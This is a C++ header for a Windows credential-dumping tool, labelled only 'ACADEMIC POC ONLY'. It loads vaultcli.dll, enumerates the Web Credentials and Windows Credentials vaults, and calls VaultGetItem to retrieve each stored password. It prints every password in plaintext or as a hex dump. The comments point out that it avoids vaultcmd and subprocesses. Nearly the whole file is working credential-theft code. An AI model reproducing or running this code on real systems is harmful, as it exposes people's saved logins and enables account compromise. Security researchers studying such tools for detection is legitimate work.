#ifndef VAULT_DUMP_H
#define VAULT_DUMP_H

// Windows Vault full extraction via native Vault API (vaultcli.dll).
//
// Enumerates both vaults (Web Credentials, Windows Credentials) and calls
// VaultGetItem to retrieve the plaintext AuthenticatorElement for each item.
//
// No _popen, no vaultcmd, no subprocess. Language-independent.
//
// Structure: VAULT_ITEM_WIN8 (Windows 8/10/11).
//
// ACADEMIC POC ONLY.

#include <windows.h>
#include <objbase.h>
#include <sddl.h>
#include <iostream>
#include <string>
#include <vector>
#include <sstream>
#include <iomanip>
#include <cstring>

#pragma comment(lib, "ole32.lib")

namespace VaultDump {

    // =========================================================================
    // Vault API types (declared manually for portability)
    // =========================================================================

    typedef enum _VAULT_ELEMENT_TYPE {
        ElementType_Boolean = 0,
        ElementType_Short,
        ElementType_UnsignedShort,
        ElementType_Integer,
        ElementType_UnsignedInteger,
        ElementType_Double,
        ElementType_Guid,
        ElementType_String,
        ElementType_ByteArray,
        ElementType_ProtectedArray,
        ElementType_Attribute,
        ElementType_Sid,
        ElementType_Max
    } VAULT_ELEMENT_TYPE;

    typedef struct _VAULT_BYTE_ARRAY {
        DWORD Length;
        PBYTE Data;
    } VAULT_BYTE_ARRAY, *PVAULT_BYTE_ARRAY;

    // Runtime layout on Windows 10/11 has two extra DWORDs before Type.
    #pragma pack(push, 8)
    typedef struct _VAULT_ITEM_ELEMENT {
        DWORD Unknown1;
        DWORD Unknown2;
        VAULT_ELEMENT_TYPE Type;
        DWORD SchemaElementId;
        union {
            BOOL             Boolean;
            SHORT            Short;
            USHORT           UnsignedShort;
            INT              Integer;
            UINT             UnsignedInteger;
            DOUBLE           Double;
            GUID             Guid;
            LPWSTR           String;
            VAULT_BYTE_ARRAY ByteArray;
            VAULT_BYTE_ARRAY ProtectedArray;
            DWORD            Attribute;
            PSID             Sid;
        };
    } VAULT_ITEM_ELEMENT, *PVAULT_ITEM_ELEMENT;

    // Layout observed at runtime: LastModified before dwFlags.
    typedef struct _VAULT_ITEM_WIN8 {
        GUID                 SchemaId;
        LPWSTR               pszCredentialFriendlyName;
        PVAULT_ITEM_ELEMENT  pResourceElement;
        PVAULT_ITEM_ELEMENT  pIdentityElement;
        PVAULT_ITEM_ELEMENT  pAuthenticatorElement;
        PVAULT_ITEM_ELEMENT  pPackageSid;
        FILETIME             LastModified;
        DWORD                dwFlags;
        DWORD                dwPropertiesCount;
        PVAULT_ITEM_ELEMENT  pProperties;
    } VAULT_ITEM_WIN8, *PVAULT_ITEM_WIN8;
    #pragma pack(pop)

    typedef DWORD (WINAPI *tVaultEnumerateVaults)(DWORD, DWORD*, GUID**);
    typedef DWORD (WINAPI *tVaultOpenVault)      (GUID*, DWORD, PVOID*);
    typedef DWORD (WINAPI *tVaultEnumerateItems) (PVOID, DWORD, DWORD*, PVOID**);
    typedef DWORD (WINAPI *tVaultGetItem)        (PVOID, GUID*, PVAULT_ITEM_ELEMENT,
                                                  PVAULT_ITEM_ELEMENT, PVAULT_ITEM_ELEMENT,
                                                  HWND, DWORD, PVAULT_ITEM_WIN8*);
    typedef DWORD (WINAPI *tVaultCloseVault)     (PVOID*);
    typedef DWORD (WINAPI *tVaultFree)           (PVOID);

    // =========================================================================
    // Helpers
    // =========================================================================

    inline std::string WStringToString(const std::wstring& wstr) {
        if (wstr.empty()) return "";
        int size = WideCharToMultiByte(CP_UTF8, 0, wstr.c_str(), -1,
                                       nullptr, 0, nullptr, nullptr);
        std::string result(size - 1, 0);
        WideCharToMultiByte(CP_UTF8, 0, wstr.c_str(), -1,
                            &result[0], size, nullptr, nullptr);
        return result;
    }

    inline std::string BytesToHex(const BYTE* d, size_t n) {
        std::ostringstream ss;
        for (size_t i = 0; i < n; ++i)
            ss << std::hex << std::setw(2) << std::setfill('0') << (int)d[i];
        return ss.str();
    }

    inline std::wstring ExtractWString(PVAULT_ITEM_ELEMENT elem) {
        if (!elem) return L"";

        if (elem->Type == ElementType_String && elem->String)
            return elem->String;

        if (elem->Type == ElementType_ByteArray ||
            elem->Type == ElementType_ProtectedArray) {
            auto& ba = (elem->Type == ElementType_ByteArray)
                       ? elem->ByteArray : elem->ProtectedArray;
            if (!ba.Data || ba.Length == 0) return L"";
            if (ba.Length % 2 == 0) {
                std::wstring result(reinterpret_cast<wchar_t*>(ba.Data),
                                    ba.Length / sizeof(wchar_t));
                while (!result.empty() && result.back() == L'\0')
                    result.pop_back();
                return result;
            }
        }
        return L"";
    }

    inline std::string SIDToString(PSID sid) {
        if (!sid) return "";
        LPWSTR str = nullptr;
        if (ConvertSidToStringSidW(sid, &str)) {
            std::string r = WStringToString(str);
            LocalFree(str);
            return r;
        }
        return "";
    }

    // =========================================================================
    // Full dump with VaultGetItem
    // =========================================================================

    inline bool DumpViaNativeApi() {
        std::cout << "\n=== Windows Vault (native API, full extraction) ===\n";

        HMODULE hDll = LoadLibraryW(L"vaultcli.dll");
        if (!hDll) {
            std::cout << "[-] Could not load vaultcli.dll\n";
            return false;
        }

        auto pVaultEnumerateVaults = (tVaultEnumerateVaults)
            GetProcAddress(hDll, "VaultEnumerateVaults");
        auto pVaultOpenVault = (tVaultOpenVault)
            GetProcAddress(hDll, "VaultOpenVault");
        auto pVaultEnumerateItems = (tVaultEnumerateItems)
            GetProcAddress(hDll, "VaultEnumerateItems");
        auto pVaultGetItem = (tVaultGetItem)
            GetProcAddress(hDll, "VaultGetItem");
        auto pVaultCloseVault = (tVaultCloseVault)
            GetProcAddress(hDll, "VaultCloseVault");
        auto pVaultFree = (tVaultFree)
            GetProcAddress(hDll, "VaultFree");

        if (!pVaultEnumerateVaults || !pVaultOpenVault ||
            !pVaultEnumerateItems || !pVaultGetItem ||
            !pVaultCloseVault || !pVaultFree) {
            std::cout << "[-] Missing vault API exports\n";
            FreeLibrary(hDll);
            return false;
        }

        DWORD vaultCount = 0;
        GUID* vaultGuids = nullptr;
        DWORD rc = pVaultEnumerateVaults(0, &vaultCount, &vaultGuids);
        if (rc != ERROR_SUCCESS) {
            std::cout << "[-] VaultEnumerateVaults failed: " << rc << "\n";
            FreeLibrary(hDll);
            return false;
        }

        std::cout << "[+] Enumerated " << vaultCount << " vault(s)\n";

        bool anyItem = false;
        int totalItems = 0;

        for (DWORD i = 0; i < vaultCount; ++i) {
            wchar_t guidStr[64] = {0};
            StringFromGUID2(vaultGuids[i], guidStr, 64);

            std::cout << "\n--- Vault #" << (i + 1)
                      << " (GUID: " << WStringToString(guidStr) << ") ---\n";

            PVOID hVault = nullptr;
            rc = pVaultOpenVault(&vaultGuids[i], 0, &hVault);
            if (rc != ERROR_SUCCESS) {
                std::cout << "[-] VaultOpenVault failed: " << rc << "\n";
                continue;
            }

            DWORD itemCount = 0;
            PVAULT_ITEM_WIN8 items = nullptr;
            rc = pVaultEnumerateItems(hVault, 0x200, &itemCount, (PVOID**)&items);
            if (rc != ERROR_SUCCESS) {
                std::cout << "[-] VaultEnumerateItems failed: " << rc << "\n";
                pVaultCloseVault(&hVault);
                continue;
            }

            std::cout << "[+] Items: " << itemCount << "\n";
            totalItems += itemCount;

            for (DWORD j = 0; j < itemCount; ++j) {
                auto& item = items[j];
                anyItem = true;

                // Extract resource / identity / SID from the enumeration item.
                std::wstring friendly = item.pszCredentialFriendlyName
                                        ? item.pszCredentialFriendlyName : L"(unnamed)";
                std::wstring resource = ExtractWString(item.pResourceElement);
                std::wstring identity = ExtractWString(item.pIdentityElement);

                std::cout << "\n  [" << (j + 1) << "] "
                          << WStringToString(friendly) << "\n";
                std::cout << "      Resource: " << WStringToString(resource) << "\n";
                std::cout << "      Identity: " << WStringToString(identity) << "\n";

                // SID
                if (item.pPackageSid && item.pPackageSid->Type == ElementType_Sid) {
                    std::string sid = SIDToString(item.pPackageSid->Sid);
                    if (!sid.empty())
                        std::cout << "      Package SID: " << sid << "\n";
                }

                // =========================================================
                // VaultGetItem — retrieve the plaintext authenticator
                // =========================================================
                PVAULT_ITEM_WIN8 fullItem = nullptr;
                DWORD grc = pVaultGetItem(
                    hVault,
                    &item.SchemaId,
                    item.pResourceElement,
                    item.pIdentityElement,
                    item.pPackageSid,
                    NULL,        // HWND
                    0,           // flags
                    &fullItem);

                if (grc == ERROR_SUCCESS && fullItem) {
                    std::wstring password = ExtractWString(fullItem->pAuthenticatorElement);

                    if (!password.empty()) {
                        std::cout << "      Password: "
                                  << WStringToString(password) << "\n";
                    } else if (fullItem->pAuthenticatorElement &&
                               fullItem->pAuthenticatorElement->Type ==
                                   ElementType_ByteArray &&
                               fullItem->pAuthenticatorElement->ByteArray.Data &&
                               fullItem->pAuthenticatorElement->ByteArray.Length > 0) {
                        // Fallback: hex dump
                        auto& ba = fullItem->pAuthenticatorElement->ByteArray;
                        std::cout << "      Password (hex): "
                                  << BytesToHex(ba.Data, ba.Length) << "\n";
                    } else if (fullItem->pAuthenticatorElement &&
                               fullItem->pAuthenticatorElement->Type ==
                                   ElementType_ProtectedArray &&
                               fullItem->pAuthenticatorElement->ProtectedArray.Data &&
                               fullItem->pAuthenticatorElement->ProtectedArray.Length > 0) {
                        auto& pa = fullItem->pAuthenticatorElement->ProtectedArray;
                        std::cout << "      Password (protected, hex): "
                                  << BytesToHex(pa.Data, pa.Length) << "\n";
                        std::cout << "      (requires admin to decrypt)\n";
                    } else {
                        std::cout << "      Password: (not available)\n";
                    }

                    pVaultFree(fullItem);
                } else {
                    std::cout << "      Password: (VaultGetItem failed: "
                              << grc << ")\n";
                }
            }

            pVaultFree(items);
            pVaultCloseVault(&hVault);
        }

        pVaultFree(vaultGuids);
        FreeLibrary(hDll);
        return anyItem;
    }

    // =========================================================================
    // Orchestrator
    // =========================================================================

    inline void Run() {
        bool success = DumpViaNativeApi();
        if (!success) {
            std::cout << "\n[i] Vault is empty or inaccessible.\n";
        }
    }
}

#endif